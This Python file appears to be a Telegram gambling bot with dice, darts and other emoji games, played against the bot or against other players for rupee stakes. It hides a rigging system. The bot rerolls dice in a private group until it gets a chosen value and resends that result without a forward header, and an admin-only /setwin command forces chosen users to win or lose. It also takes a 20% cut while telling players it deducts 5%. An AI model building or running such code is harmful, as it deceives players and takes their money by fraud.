import time
import asyncio
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot_instance import bot
from wallet import get_balance, adjust_balance, resolve_amount
from helpers import ensure_user
from pvp_state import create_challenge, get_challenge, remove_challenge

RIG_GROUP = "@thecassinorigpvt"
HOUSE_EDGE = 0.20  # 5% house edge
PVP_TIMEOUT = 120  # 120 seconds auto-cancel
FORCE_RIG_USERS = {}  # {user_id: "win" | "lose"}

# Supported emoji shortcuts
GAME_EMOJIS = {
    "dice": "🎲",
    "bowl": "🎳",
    "dart": "🎯",
    "basket": "🏀",
    "football": "⚽",
    "slots": "🎰"
}

# --- 1. SILENT RIG ROLL ENGINE ---
def roll_rigged_emoji(chat_id, emoji, target_value=None):
    """
    Rolls silently in @thecassinorigpvt until target_value is hit,
    then resends using file_id to omit forward headers.
    """
    if target_value is None:
        return bot.send_dice(chat_id, emoji=emoji)

    matching_msg = None
    for _ in range(40):
        try:
            msg = bot.send_dice(RIG_GROUP, emoji=emoji)
            if msg.dice.value == target_value:
                matching_msg = msg
                break
        except Exception:
            break

    if matching_msg and hasattr(matching_msg.dice, 'file_id'):
        return bot.send_cached_media(chat_id, matching_msg.dice.file_id)
    else:
        return bot.send_dice(chat_id, emoji=emoji)


# --- 2. ADMIN RIG CONTROL COMMAND ---
@bot.message_handler(commands=["setwin"])
def cmd_setwin(message):
    if (message.from_user.username or "").lower() != "mrpuppyx":
        return

    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ Usage: <code>/setwin <user_id> <win|lose|reset></code>", parse_mode="HTML")
        return

    try:
        target_id = int(args[1])
        action = args[2].lower()
        if action in ["win", "lose"]:
            FORCE_RIG_USERS[target_id] = action
            bot.reply_to(message, f"✅ User <code>{target_id}</code> rig set to <b>{action.upper()}</b>", parse_mode="HTML")
        else:
            FORCE_RIG_USERS.pop(target_id, None)
            bot.reply_to(message, f"🔄 Rig reset for user <code>{target_id}</code>.", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# --- 3. UNIFIED COMMAND PARSER FOR EMOJI GAMES & PVP ---
@bot.message_handler(commands=["dice", "bowl", "dart", "basket", "football", "pvp", "duel"])
def handle_game_init(message):
    ensure_user(message)
    sender_id = message.from_user.id
    sender_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    
    args = message.text.split()
    cmd = args[0].replace("/", "").lower()
    
    # Defaults
    game_type = "dice" if cmd in ["pvp", "duel"] else cmd
    emoji = GAME_EMOJIS.get(game_type, "🎲")
    
    amount_str = "10"
    rounds = 1
    target_user = None

    if cmd in ["pvp", "duel"]:
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Usage: <code>/pvp <amount> [game] [rounds] [@user]</code>", parse_mode="HTML")
            return
        amount_str = args[1]
        if len(args) >= 3 and args[2].lower() in GAME_EMOJIS:
            game_type = args[2].lower()
            emoji = GAME_EMOJIS[game_type]
    else:
        if len(args) >= 2:
            amount_str = args[1]

    # Parse rounds & target opponent
    for arg in args[2:]:
        if arg.isdigit():
            rounds = int(arg)
        elif arg.startswith("@"):
            target_user = arg

    if not target_user and message.reply_to_message and message.reply_to_message.from_user:
        reply_u = message.reply_to_message.from_user
        target_user = f"@{reply_u.username}" if reply_u.username else reply_u.first_name

    amount = resolve_amount(sender_id, amount_str)
    if amount is None or amount <= 0:
        bot.reply_to(message, "❌ Invalid bet amount.")
        return

    user_bal = get_balance(sender_id)
    if amount > user_bal:
        bot.reply_to(message, f"❌ Insufficient balance! You have ₹{user_bal:.2f}.")
        return

    # Case A: Play VS Bot
    if not target_user or target_user.lower() == sender_user.lower() or target_user.lower() == "@bot":
        run_bot_match(message, emoji, amount, rounds)
        return

    # Case B: PVP Challenge against User
    adjust_balance(sender_id, -amount)
    challenge_id = create_challenge(sender_id, amount, game_type)
    
    # Save extra metadata in pvp state
    challenge = get_challenge(challenge_id)
    challenge.update({
        "challenger_username": sender_user,
        "opponent_username": target_user,
        "rounds": rounds,
        "emoji": emoji,
        "chat_id": message.chat.id,
        "accepted": False
    })

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Accept", callback_data=f"pvp_acc:{challenge_id}"),
        InlineKeyboardButton("❌ Cancel", callback_data=f"pvp_can:{challenge_id}")
    )

    msg = bot.reply_to(
        message,
        f"⚔️ <b>PVP CHALLENGE INITIATED</b> {emoji}\n\n"
        f"👤 <b>Challenger:</b> {sender_user}\n"
        f"🎯 <b>Opponent:</b> {target_user}\n"
        f"💰 <b>Bet Amount:</b> ₹{amount:.2f}\n"
        f"🔁 <b>Rounds:</b> {rounds}\n\n"
        f"⏳ {target_user}, you have 120s to accept!",
        parse_mode="HTML",
        reply_markup=markup
    )
    
    asyncio.run_coroutine_threadsafe(auto_cancel_timeout(msg.chat.id, msg.message_id, challenge_id), asyncio.get_event_loop())


# --- 4. VS BOT ENGINE ---
def run_bot_match(message, emoji, bet, rounds):
    user_id = message.from_user.id
    chat_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    adjust_balance(user_id, -bet)
    user_wins, bot_wins = 0, 0
    rig_status = FORCE_RIG_USERS.get(user_id)

    bot.send_message(chat_id, f"🎮 <b>Match vs Bot Started ({rounds} Rounds, ₹{bet:.2f} Bet)</b>", parse_mode="HTML")

    for r in range(1, rounds + 1):
        bot.send_message(chat_id, f"<b>--- ROUND {r}/{rounds} ---</b>\n{username} roll the {emoji} now!", parse_mode="HTML")
        u_roll = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)

        target_val = None
        if rig_status == "lose":
            target_val = min(6, u_roll + 1) if u_roll < 6 else 6
        elif rig_status == "win":
            target_val = max(1, u_roll - 1) if u_roll > 1 else 1

        bot.send_message(chat_id, f"Bot rolling {emoji}...")
        b_roll_msg = roll_rigged_emoji(chat_id, emoji, target_value=target_val)
        b_roll = b_roll_msg.dice.value if hasattr(b_roll_msg, 'dice') else random.randint(1, 6)
        time.sleep(2)

        if u_roll > b_roll:
            user_wins += 1
        elif b_roll > u_roll:
            bot_wins += 1

    if user_wins == bot_wins:
        bot.send_message(chat_id, f"⚖️ <b>TIE! Starting Tie-Breaker Round...</b>", parse_mode="HTML")
        u_tb = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)
        b_tb = roll_rigged_emoji(chat_id, emoji).dice.value
        time.sleep(2)
        if u_tb >= b_tb:
            user_wins += 1
        else:
            bot_wins += 1

    if user_wins > bot_wins:
        prize = (bet * 2) * (1 - HOUSE_EDGE)
        adjust_balance(user_id, prize)
        bot.send_message(chat_id, f"🏆 <b>GAME OVER!</b>\n\n{username} won ₹{prize:.2f}! 🎉", parse_mode="HTML")
    else:
        bot.send_message(chat_id, f"💀 <b>GAME OVER!</b>\n\nBot won the match! Better luck next time.", parse_mode="HTML")


# --- 5. PVP CALLBACK HANDLER & GAME LOOPS ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("pvp_"))
def handle_pvp_callbacks(call):
    action, challenge_id = call.data.split(":")
    challenge = get_challenge(challenge_id)

    if not challenge:
        bot.answer_callback_query(call.id, "❌ Challenge expired or removed.", show_alert=True)
        return

    caller_id = call.from_user.id
    caller_user = f"@{call.from_user.username}" if call.from_user.username else call.from_user.first_name

    # Cancel action
    if action == "pvp_can":
        if caller_id != challenge["challenger_id"] and caller_user.lower() != challenge.get("opponent_username", "").lower():
            bot.answer_callback_query(call.id, "❌ Only involved players can cancel!", show_alert=True)
            return

        adjust_balance(challenge["challenger_id"], challenge["amount"])
        remove_challenge(challenge_id)
        bot.edit_message_text("❌ <b>PVP Match Cancelled. Bet refunded.</b>", challenge["chat_id"], call.message.message_id, parse_mode="HTML")
        return

    # Accept action
    if action == "pvp_acc":
        if caller_user.lower() != challenge.get("opponent_username", "").lower():
            bot.answer_callback_query(call.id, "❌ Only the challenged player can accept!", show_alert=True)
            return

        opp_bal = get_balance(caller_id)
        if opp_bal < challenge["amount"]:
            bot.answer_callback_query(call.id, f"❌ You need at least ₹{challenge['amount']:.2f} to accept!", show_alert=True)
            return

        adjust_balance(caller_id, -challenge["amount"])
        challenge["acceptor_id"] = caller_id
        challenge["accepted"] = True

        bot.edit_message_text(
            f"⚔️ <b>MATCH ACCEPTED!</b>\n{challenge['challenger_username']} vs {challenge['opponent_username']}\nStarting games...",
            challenge["chat_id"], call.message.message_id, parse_mode="HTML"
        )
        
        run_pvp_match(challenge_id)


def run_pvp_match(challenge_id):
    c = get_challenge(challenge_id)
    chat_id = c["chat_id"]
    p1 = c["challenger_username"]
    p2 = c["opponent_username"]
    emoji = c["emoji"]
    rounds = c["rounds"]

    p1_wins, p2_wins = 0, 0
    summary = []

    for r in range(1, rounds + 1):
        bot.send_message(chat_id, f"<b>--- ROUND {r}/{rounds} ---</b>", parse_mode="HTML")

        bot.send_message(chat_id, f"{p1} roll the {emoji} now!")
        r1 = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)

        bot.send_message(chat_id, f"{p2} roll the {emoji} now!")
        r2 = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)

        if r1 > r2:
            p1_wins += 1
            summary.append(f"Round {r}: {p1} ({r1}) vs {p2} ({r2}) ➔ <b>{p1} won</b>")
        elif r2 > r1:
            p2_wins += 1
            summary.append(f"Round {r}: {p1} ({r1}) vs {p2} ({r2}) ➔ <b>{p2} won</b>")
        else:
            summary.append(f"Round {r}: {p1} ({r1}) vs {p2} ({r2}) ➔ <b>Tie</b>")

    if p1_wins == p2_wins:
        bot.send_message(chat_id, "⚖️ <b>TIE! Starting Tie-Breaker Round...</b>", parse_mode="HTML")
        bot.send_message(chat_id, f"{p1} roll the {emoji} now!")
        r1 = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)

        bot.send_message(chat_id, f"{p2} roll the {emoji} now!")
        r2 = bot.send_dice(chat_id, emoji=emoji).dice.value
        time.sleep(2)

        if r1 >= r2:
            p1_wins += 1
        else:
            p2_wins += 1
        summary.append(f"Tie-Breaker: {p1} ({r1}) vs {p2} ({r2})")

    total_pot = c["amount"] * 2
    prize = total_pot * (1 - HOUSE_EDGE)

    if p1_wins > p2_wins:
        winner, loser = p1, p2
        adjust_balance(c["challenger_id"], prize)
    else:
        winner, loser = p2, p1
        adjust_balance(c["acceptor_id"], prize)

    summary_msg = (
        f"🏆 <b>GAME OVER - SUMMARY</b> 🏆\n\n"
        + "\n".join(summary)
        + f"\n\n👑 <b>Winner:</b> {winner}\n"
        f"💀 <b>Loser:</b> {loser}\n"
        f"💵 <b>Prize Payout:</b> ₹{prize:.2f} (5% House Edge deducted)"
    )
    bot.send_message(chat_id, summary_msg, parse_mode="HTML")
    remove_challenge(challenge_id)


async def auto_cancel_timeout(chat_id, msg_id, challenge_id):
    await asyncio.sleep(PVP_TIMEOUT)
    c = get_challenge(challenge_id)
    if c and not c.get("accepted"):
        adjust_balance(c["challenger_id"], c["amount"])
        remove_challenge(challenge_id)
        try:
            bot.edit_message_text("⌛ <b>Challenge timed out after 120s. Bet refunded.</b>", chat_id, msg_id, parse_mode="HTML")
        except Exception:
            pass
